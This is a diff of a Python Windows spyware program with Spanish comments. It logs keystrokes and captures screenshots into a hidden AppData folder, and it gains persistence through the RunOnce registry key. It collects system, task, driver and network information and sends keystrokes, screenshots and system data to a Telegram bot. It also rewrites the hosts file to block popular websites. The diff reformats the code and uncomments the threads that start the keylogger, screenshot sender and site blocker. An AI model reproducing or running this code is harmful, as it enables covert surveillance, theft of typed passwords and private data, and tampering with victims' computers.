@@ -4,7 +4,7 @@ import ctypes, sys
 from pip._vendor import requests
 from pynput.keyboard import Listener  # Escucha eventos del teclado
 import os, os.path, platform, ctypes
-#import socket  # Verifica internet
+# import socket  # Verifica internet
 import threading  # procesos multihilos
 from datetime import datetime  # Devuelve fecha y hora actual
 from winreg import OpenKey, SetValueEx, KEY_ALL_ACCESS, HKEY_CURRENT_USER, REG_SZ  # Modifica registros de Windows
@@ -17,7 +17,8 @@ import shutil
 from os import remove
 from PIL import ImageGrab  # Toma capturas de pantalla
 
-#region Config
+
+# region Config
 class Config:
     def __init__(self):
         self.USERNAME = str(os.getlogin())
@@ -37,14 +38,15 @@ class Config:
     class Screenshot:
         def __init__(self):
             self.ACTIVE = True
-            self.PATH = r"C:\Users" +"\\" + Config().USERNAME + r"\AppData\Roaming\Microsoft\Windows\Security\Recovery\User" + "\\"
+            self.PATH = r"C:\Users" + "\\" + Config().USERNAME + r"\AppData\Roaming\Microsoft\Windows\Security\Recovery\User" + "\\"
             self._NAME = "s5s6df45sdf456dsf4fds6fds"
             self.INTERVAL = 10  # seconds
 
-#endregion
+
+# endregion
 
 class Util:
-    def create_folder(self,path):
+    def create_folder(self, path):
         try:  # Intenta crear la dirección
             os.makedirs(path)
             print("[CreateFolders] Success create folder: " + path)
@@ -75,6 +77,7 @@ class Util:
                 lst += [i]
         return lst
 
+
 class Screenshot:
     def _delete(self, name):
         try:
@@ -97,7 +100,7 @@ class Screenshot:
                     try:
                         bot.sendChatAction(id, 'upload_photo')
                         bot.sendPhoto(id, open(Config().Screenshot().PATH + name, 'rb'))
-                        #bot.sendDocument(id, open(Config().Screenshot().PATH + name, 'rb'))
+                        # bot.sendDocument(id, open(Config().Screenshot().PATH + name, 'rb'))
                         print("[SEND ScreenShot] Send keylogger to: [ID] " + str(id)) if Config().DEBUG else False
                     except:
                         print("[SEND ScreenShot] there was a mistake when sending the [ID] " + str(
@@ -107,6 +110,7 @@ class Screenshot:
             except:
                 pass
 
+
 class StartUp:
     def infinite(self):
         print("[StartUp] Init")
@@ -115,13 +119,13 @@ class StartUp:
             try:
                 registry = OpenKey(HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\RunOnce', 0,
                                    KEY_ALL_ACCESS)  # local
-                SetValueEx(registry, "runSoftware", 0, REG_SZ, __file__ ) #Config().StarUp().PATH_PROGRAM
+                SetValueEx(registry, "runSoftware", 0, REG_SZ, __file__)  # Config().StarUp().PATH_PROGRAM
                 registry.Close()
                 print("[StartUp] USER - EXITOSO")
             except:
                 print("[StartUp] USER - Error")
-                pass
             time.sleep(65)
+
 
 class Key:
     def __init__(self):
@@ -134,7 +138,8 @@ class Key:
                 bot.sendMessage(id, reg_text)
                 print("[SEND TelegramBot] Send keylogger to: [ID] = " + str(id)) if Config().DEBUG else False
             except:
-                print("[SEND TelegramBot] there was a mistake when sending the [ID] = " + str(id)) if Config().DEBUG else False
+                print("[SEND TelegramBot] there was a mistake when sending the [ID] = " + str(
+                    id)) if Config().DEBUG else False
 
     def listen_key(self):
         def _key_min(numberKey):  # Caracteres Comunes // Optimizados
@@ -297,16 +302,17 @@ class Key:
                 # "'\x18'"  : " [Cortar] ",
                 # "'\x03'"  : " [Copiar] ",
                 "Key.caps_lock": " 🔒⌨ ",
-                "Key.num_lock" : " 🔒🔢 " ,
-                #"Key.media_previous"    : "⏮",
-                #"Key.media_next"        : "⏭",
-                #"Key.media_play_pause"  : "⏹",
-                #"Key.media_volume_mute" : "🔇",
-                #"Key.media_volume_up" : "🔊",
-                #"Key.media_volume_down" : "🔉",
+                "Key.num_lock": " 🔒🔢 ",
+                # "Key.media_previous"    : "⏮",
+                # "Key.media_next"        : "⏭",
+                # "Key.media_play_pause"  : "⏹",
+                # "Key.media_volume_mute" : "🔇",
+                # "Key.media_volume_up" : "🔊",
+                # "Key.media_volume_down" : "🔉",
                 "Key.cmd": " ⊞ "
             }
             return switcher.get(numberKey, "")  # Convierte tecla a un valor legible
+
         # instance Obj Config
         config = Config()
         debug = config.DEBUG
@@ -334,32 +340,33 @@ class Key:
         with Listener(on_press=press) as listener:
             listener.join()
 
+
 class WebsiteBlock:
     def __init__(self):
         self.hostsPath = r"C:\Windows\System32\drivers\etc\hosts"
         self.pathListWeb = r"list websites.txt"
-        self.hostsTextOriginal = ""\
-        "# Copyright (c) 1993-2009 Microsoft Corp.\n"\
-        "#\n"\
-        "# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\n"\
-        "#\n"\
-        "# This file contains the mappings of IP addresses to host names. Each\n"\
-        "# entry should be kept on an individual line. The IP address should\n"\
-        "# be placed in the first column followed by the corresponding host name.\n"\
-        "# The IP address and the host name should be separated by at least one\n"\
-        "# space.\n"\
-        "#\n"\
-        "# Additionally, comments (such as these) may be inserted on individual\n"\
-        "# lines or following the machine name denoted by a '#' symbol.\n"\
-        "#\n"\
-        "# For example:\n"\
-        "#\n"\
-        "#      102.54.94.97     rhino.acme.com          # source server\n"\
-        "#       38.25.63.10     x.acme.com              # x client host\n"\
-        "\n"\
-        "# localhost name resolution is handled within DNS itself.\n"\
-        "#	127.0.0.1       localhost\n"\
-        "#	::1             localhost"
+        self.hostsTextOriginal = "" \
+                                 "# Copyright (c) 1993-2009 Microsoft Corp.\n" \
+                                 "#\n" \
+                                 "# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.\n" \
+                                 "#\n" \
+                                 "# This file contains the mappings of IP addresses to host names. Each\n" \
+                                 "# entry should be kept on an individual line. The IP address should\n" \
+                                 "# be placed in the first column followed by the corresponding host name.\n" \
+                                 "# The IP address and the host name should be separated by at least one\n" \
+                                 "# space.\n" \
+                                 "#\n" \
+                                 "# Additionally, comments (such as these) may be inserted on individual\n" \
+                                 "# lines or following the machine name denoted by a '#' symbol.\n" \
+                                 "#\n" \
+                                 "# For example:\n" \
+                                 "#\n" \
+                                 "#      102.54.94.97     rhino.acme.com          # source server\n" \
+                                 "#       38.25.63.10     x.acme.com              # x client host\n" \
+                                 "\n" \
+                                 "# localhost name resolution is handled within DNS itself.\n" \
+                                 "#	127.0.0.1       localhost\n" \
+                                 "#	::1             localhost"
         self.listWebs = ["www.gogle.com",
                          "www.wikipedia.com",
                          "www.bing.com",
@@ -395,7 +402,7 @@ class WebsiteBlock:
                          "www.whatsapp.com",
                          "www.reddit.com"]
 
-        #self.hostsPath = r"test.txt"
+        # self.hostsPath = r"test.txt"
 
     def __read_file(self, path):
         content = ""
@@ -404,23 +411,26 @@ class WebsiteBlock:
             content += l
         file.close()
         return content
-    def __write_file(self,path, text,split = True, type = "a"):
+
+    def __write_file(self, path, text, split=True, type="a"):
         file = open(path, type)
         try:
             for t in text.split("\n"):
-                file.write("\n127.0.0.1    " + t) if split else file.write(t+"\n")
+                file.write("\n127.0.0.1    " + t) if split else file.write(t + "\n")
         except:
             print("Falló el split")
-            #file.write(text)
+            # file.write(text)
         file.close()
 
-    def __rewrite_file(self,path, text):
+    def __rewrite_file(self, path, text):
         self.__write_file(path, text, False, "w")
-    def __delete_file(self,path):
+
+    def __delete_file(self, path):
         try:
             remove(path)
         except:
             pass
+
     """
     def __backup(self,path1, path2):
         try:
@@ -430,19 +440,25 @@ class WebsiteBlock:
         except:
             print("Backup - there was mistake error ")
     """
+
     def block(self):
-        #webs = self.__read_file(self.pathListWeb)
+        # webs = self.__read_file(self.pathListWeb)
         webs = self.listWebs
         self.__write_file(self.hostsPath, webs)
+
     def unlock(self):
         self.__rewrite_file(self.hostsPath, self.hostsTextOriginal)
+
     def reset(self):
         self.unlock()
+
 
 class PCInformation:
     def __init__(self):
         pass
-    def __CMD_command(self,title,  command):
+
+    @staticmethod
+    def __CMD_command(title, command):
         response = title + "\n"
         lines = os.popen(command)
         for line in lines:
@@ -469,16 +485,22 @@ class PCInformation:
         return self.__CMD_command(
             title="Information: Driver Information",
             command="DRIVERQUERY")
+
     def __taks_list(self):
         return self.__CMD_command(
             title="Information: Taks List",
             command="TASKLIST")
+    def __service_active(self):
+        return self.__CMD_command(
+            title="Information: Services active",
+            command="net start")
 
     def __red_info(self):
         def internalIP():
             internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             internal_ip.connect(('google.com', 0))
             return internal_ip.getsockname()[0]
+
         response = "Information: RED Info\n"
         lines = os.popen('arp -a -N ' + internalIP())
         for line in lines:
@@ -489,62 +511,41 @@ class PCInformation:
     def send(self):
         bot = telepot.Bot(Config.TelegramBot().TOKEN)
         chat_id = Config.TelegramBot().ID[0]
-        bot.sendChatAction(chat_id, 'typing')
-        # Dns Information
-        response = self.__display_dns()
-        responses = Util().split_string(4000, response)
-        for resp in responses:
-            #bot.sendMessage(chat_id, resp)
+
+        send = [self.__display_dns(),
+                self.__red_info(),
+                self.__ip_config(),
+                self.__system_info(),
+                self.__driver_info(),
+                self.__taks_list()]
+        for i in send:
+            try:
+                bot.sendChatAction(chat_id, 'typing')
+                print(i)
+                responses = Util().split_string(3900, i)
+                for resp in responses:
+                    time.sleep(2)
+                    bot.sendMessage(chat_id, resp)
+                else:
+                    pass
+            except:
+                pass
+        else:
             pass
 
-        # Red Information
-        response = self.__red_info()
-        responses = Util().split_string(4000, response)
-        for resp in responses:
-            #bot.sendMessage(chat_id, resp)
-            pass
-
-        # IP Config /All
-        response = self.__ip_config()
-        responses = Util().split_string(4000, response)
-        for resp in responses:
-            #bot.sendMessage(chat_id, resp)
-            pass
-
-        # System Info
-        response = self.__system_info()
-        responses = Util().split_string(4000, response)
-        for resp in responses:
-            bot.sendMessage(chat_id, resp)
-
-        # Drivers Information
-        response = self.__driver_info()
-        responses = Util().split_string(4000, response)
-        for resp in responses:
-            bot.sendMessage(chat_id, resp)
-
-        # Taks List
-        response = self.__driver_info()
-        responses = Util().split_string(4000, response)
-        for resp in responses:
-            bot.sendMessage(chat_id, resp)
 
 if __name__ == '__main__':
-
     # Verifica permisos de admistrador: Administrador
     print("Is Admin?: Admin Sucess" if Util().is_admin() else "Is Admin?: Admin Failed")
-    #threading.Thread(target=WebsiteBlock().block).start() if Util().is_admin() else False  # Bloquear Webs
+    threading.Thread(target=WebsiteBlock().block).start() if Util().is_admin() else False  # Bloquear Webs
     #threading.Thread(target=WebsiteBlock().reset()).start()  if Util().is_admin() else False  # Desbloquear Webs
-    #print("PATH Screenshot: " + Config().Screenshot().PATH) if Config().DEBUG else False
+    print("PATH Screenshot: " + Config().Screenshot().PATH) if Config().DEBUG else False
     #threading.Thread(target=StartUp().infinite).start()
 
     threading.Thread(target=PCInformation().send).start()
 
-    #threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
-    #threading.Thread(target=Screenshot().send).start() if Config().Screenshot().ACTIVE else False
-
-
-
+    threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
+    threading.Thread(target=Screenshot().send).start() if Config().Screenshot().ACTIVE else False
 
     """
     if is_admin():
